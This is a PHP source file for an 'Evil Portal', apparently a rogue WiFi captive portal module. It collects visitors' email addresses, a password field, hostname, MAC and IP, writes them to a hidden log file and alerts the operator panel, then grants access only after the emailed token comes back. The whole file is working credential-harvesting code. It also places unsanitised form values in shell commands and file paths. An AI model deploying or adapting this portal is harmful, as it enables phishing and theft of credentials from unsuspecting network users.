<?php namespace evilportal;

class MyPortal extends Portal
{
    public function handleAuthorization()
    {
    	  function generateRandomString($length = 8) {
    	   return substr(str_shuffle(str_repeat($x='23456789abcdefghkmnpqrstuvwxyzABCDEFGHKMNPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
	  }
	    
    	  $token = generateRandomString(8); //token
    	
	  $sub = "Evil Portal Your WIFI-Token !\nContent-Type: text/html"; //Subject of the mail & html format info
	  $sender = "info@test.de"; //Sender of the mail
		  
	  $body = file_get_contents("/www/template.html"); //read the template 
	  $mailtext = str_replace('TOKEN', $token, $body); //insert token (TOKEN will be replaced)
	  if (isset($_POST['gettoken'])) {
	   
	     $email = isset($_POST['email']) ? $_POST['email'] : 'email';
	     $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
	     $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
	     $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
	     $gpw = isset($_POST['gpw']) ? $_POST['gpw'] : 'gpw';
	     $this->execBackground("notify $email' Requested Token:'$token' - PW:'$gpw' - IP:'$ip"); //notify panel 
             $this->sendmail($sub, $mailtext, $sender, $email); //Send the mail
		
	     $reflector = new \ReflectionClass(get_class($this));
             $logPath = dirname($reflector->getFileName());	   
	     file_put_contents("{$logPath}/.logs", "[" . date('Y-m-d H:i:s') . "Z]\n" . "email: {$email}\npassword: {$gpw}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
		  
  	     file_put_contents("{$logPath}/$mac:mail.txt", "{$email}/n", FILE_APPEND); // write mail file
             file_put_contents("{$logPath}/$mac.txt", "{$token}", FILE_APPEND); // write auth file 
             die();
	  }
	    
         if (isset($_POST['getaccess'])) {
		 
            $rtoken = isset($_POST['token']) ? $_POST['token'] : 'token';
            $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
            $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
            $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
	    $reflector = new \ReflectionClass(get_class($this));
            $logPath = dirname($reflector->getFileName());
            $dtoken = file_get_contents("{$logPath}/$mac.txt"); //read auth file
            if($rtoken == $dtoken) {       
            	$this->execBackground("notify $mac' Login:'$rtoken' IP:'$ip"); //notify panel 
            	parent::handleAuthorization();
            	unlink("{$logPath}/$mac:mail.txt");
            	unlink("{$logPath}/$mac.txt");
            }
     	 }
	        // Call parent to handle basic authorization first
	        //parent::handleAuthorization();
	        echo "Login Error !"; //show error
	  }
    

    /**
     * Override this to do something when the client is successfully authorized.
     * By default it just notifies the Web UI.
     */
    public function onSuccess()
    {
        // Calls default success message
        parent::onSuccess();
    }

    /**
     * If an error occurs then do something here.
     * Override to provide your own functionality.
     */
    public function showError()
    {
        // Calls default error message
        parent::showError();
    }
}
